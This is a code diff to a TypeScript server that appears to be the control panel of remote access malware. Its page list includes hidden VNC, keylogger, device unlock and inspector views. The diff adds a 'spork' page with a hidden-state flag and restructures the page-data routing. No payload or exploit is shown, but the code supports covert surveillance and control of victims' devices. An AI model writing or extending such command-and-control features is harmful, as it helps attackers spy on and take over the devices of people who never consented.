@@ -26,6 +26,7 @@ const PAGE_PERMISSIONS: Record<string, Permission> = {
   permissions: 'device:permissions',
   apps: 'device:apps',
   fason: 'device:fason',
+  spork: 'device:spork',
   hvnc: 'device:hvnc',
   inspector: 'device:inspector',
   keylogger: 'device:keylogger',
@@ -118,7 +119,7 @@ export async function deviceRoutes(app: FastifyInstance) {
     if (!client) {
       return reply.code(404).send({ success: false, error: 'Client not found' });
     }
-    const data = getPageData(id, page, client);
+    const data = await getPageData(id, page, client);
     return { success: true, data };
   });
 
@@ -408,10 +409,22 @@ async function getPageData(id: string, page: string, client: any) {
     }
     case 'fason':
       return { hidden: client.fasonHidden };
-    case 'hvnc':
+    case 'keylogger': {
       return {};
-    case 'inspector':
+    }
+    case 'unlock': {
       return {};
+    }
+    case 'hvnc': {
+      return {};
+    }
+    case 'inspector': {
+      return {};
+    }
+    case 'spork': {
+      const sporkData = safeJsonParse((await dbHelpers.getOrCreateClientData(id, 'spork')));
+      return { hidden: sporkData?.hidden || false };
+    }
     default:
       return { client: formatClient(client) };
   }
